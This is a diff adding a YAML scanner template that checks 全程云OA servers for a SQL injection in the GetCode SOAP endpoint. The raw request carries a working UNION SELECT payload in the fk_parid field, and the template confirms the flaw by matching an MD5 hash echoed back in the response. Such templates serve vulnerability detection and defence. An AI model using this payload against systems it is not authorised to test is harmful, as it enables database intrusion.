@@ -1,0 +1,46 @@
+id: poc-yaml-quan-cheng-yun-getcode-sqli
+
+info:
+  name: 全程云OA GetCode SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /OA/PES/QCPES.asmx HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "http://tempuri.org/GetCode"
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetCode xmlns="http://tempuri.org/">
+              <fk_parid>1' UNION ALL SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- oCWH</fk_parid>
+              <value>1</value>
+            </GetCode>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<GetCodeResult>"
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
